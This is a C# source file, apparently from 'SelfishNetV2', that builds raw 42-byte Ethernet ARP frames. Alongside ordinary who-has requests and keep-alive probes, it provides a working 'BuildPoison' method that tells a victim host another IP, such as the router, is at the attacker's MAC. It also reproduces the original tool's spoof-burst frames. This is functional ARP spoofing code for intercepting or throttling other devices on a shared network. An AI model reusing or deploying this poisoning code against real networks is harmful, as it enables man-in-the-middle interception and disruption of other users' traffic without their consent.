namespace SelfishNetV2.Core;

/// <summary>
/// Byte-for-byte Ethernet II + ARP frame builder, matching the original
/// CArp::buildArpPacket (42 bytes; offsets verified against the golden binary):
///   0..5 dst MAC | 6..11 src MAC | 12..13 EtherType 0x0806 | 14..15 HW type 0x0001
///   16..17 Proto 0x0800 | 18 HW size 6 | 19 Proto size 4 | 20..21 opcode
///   22..27 sender MAC | 28..31 sender IP | 32..37 target MAC | 38..41 target IP
/// All builders write into caller-provided buffers — zero allocation in hot paths.
/// Parity with the original is enforced by golden-vector tests.
/// </summary>
public static class ArpFrameBuilder
{
    public const int FrameLength = 42;
    public const ushort EtherTypeArp = 0x0806;
    public const ushort OpcodeRequest = 1;
    public const ushort OpcodeReply = 2;

    /// <summary>Builds a 42-byte frame into <paramref name="frame"/> (must be ≥ 42 bytes).</summary>
    public static void Build(Span<byte> frame,
        ulong dstMac, ulong srcMac,
        ulong senderMac, uint senderIp,
        ulong targetMac, uint targetIp, ushort opcode)
    {
        if (frame.Length < FrameLength) throw new ArgumentException($"Buffer must be ≥ {FrameLength} bytes", nameof(frame));
        frame.Clear();
        WriteMac(dstMac, frame, 0);
        WriteMac(srcMac, frame, 6);
        frame[12] = 0x08; frame[13] = 0x06;           // EtherType ARP
        frame[14] = 0x00; frame[15] = 0x01;           // HW type Ethernet
        frame[16] = 0x08; frame[17] = 0x00;           // Proto IPv4
        frame[18] = 6;                                 // HW addr size
        frame[19] = 4;                                 // Proto addr size
        frame[20] = (byte)(opcode >> 8); frame[21] = (byte)(opcode & 0xFF);
        WriteMac(senderMac, frame, 22);
        WriteIp(senderIp, frame, 28);
        WriteMac(targetMac, frame, 32);
        WriteIp(targetIp, frame, 38);
    }

    public static byte[] Build(ulong dstMac, ulong srcMac,
        ulong senderMac, uint senderIp, ulong targetMac, uint targetIp, ushort opcode)
    {
        var frame = new byte[FrameLength];
        Build(frame, dstMac, srcMac, senderMac, senderIp, targetMac, targetIp, opcode);
        return frame;
    }

    /// <summary>Broadcast ARP "who-has" request (original discoverer / findMac).</summary>
    public static void BuildRequest(Span<byte> frame, ulong localMac, uint localIp, uint targetIp) =>
        Build(frame, NetKeys.BroadcastMac, localMac, localMac, localIp, 0, targetIp, OpcodeRequest);

    /// <summary>Unicast ARP request aimed at a known device (20 s keep-alive probe).</summary>
    public static void BuildUnicastProbe(Span<byte> frame, ulong localMac, uint localIp, ulong deviceMac, uint deviceIp) =>
        Build(frame, deviceMac, localMac, localMac, localIp, deviceMac, deviceIp, OpcodeRequest);

    /// <summary>Poison: tells <paramref name="targetIp"/> that <paramref name="impersonatedIp"/> is at our MAC.</summary>
    public static void BuildPoison(Span<byte> frame, ulong localMac, uint impersonatedIp, ulong targetMac, uint targetIp) =>
        Build(frame, targetMac, localMac, localMac, impersonatedIp, targetMac, targetIp, OpcodeReply);

    /// <summary>Self-refresh (original frame 3 of the spoof burst): an ARP reply "from the router"
    /// injected so OUR OWN listener re-learns the TRUE router MAC every round.</summary>
    public static void BuildSelfRefresh(Span<byte> frame, ulong localMac, uint localIp, ulong routerMac, uint routerIp) =>
        Build(frame, localMac, routerMac, routerMac, routerIp, localMac, localIp, OpcodeReply);

    /// <summary>Inert leftover (original frame 4, codegen artifact in CArp::Spoof): eth dst = eth src = us;
    /// our listener skips it. Sent only by the Legacy engine for byte-level behavioral parity.</summary>
    public static void BuildInertSelf(Span<byte> frame, ulong localMac, uint localIp, ulong victimMac, uint victimIp) =>
        Build(frame, localMac, localMac, victimMac, victimIp, localMac, localIp, OpcodeReply);

    /// <summary>Genuine restore: tells <paramref name="targetIp"/> the real MAC of <paramref name="realIp"/>.</summary>
    public static void BuildRestore(Span<byte> frame, ulong realMac, uint realIp, ulong targetMac, uint targetIp) =>
        Build(frame, targetMac, realMac, realMac, realIp, targetMac, targetIp, OpcodeReply);

    private static void WriteMac(ulong mac, Span<byte> dst, int offset)
    {
        dst[offset] = (byte)(mac >> 40);
        dst[offset + 1] = (byte)(mac >> 32);
        dst[offset + 2] = (byte)(mac >> 24);
        dst[offset + 3] = (byte)(mac >> 16);
        dst[offset + 4] = (byte)(mac >> 8);
        dst[offset + 5] = (byte)mac;
    }

    private static void WriteIp(uint ip, Span<byte> dst, int offset)
    {
        dst[offset] = (byte)(ip >> 24);
        dst[offset + 1] = (byte)(ip >> 16);
        dst[offset + 2] = (byte)(ip >> 8);
        dst[offset + 3] = (byte)ip;
    }
}
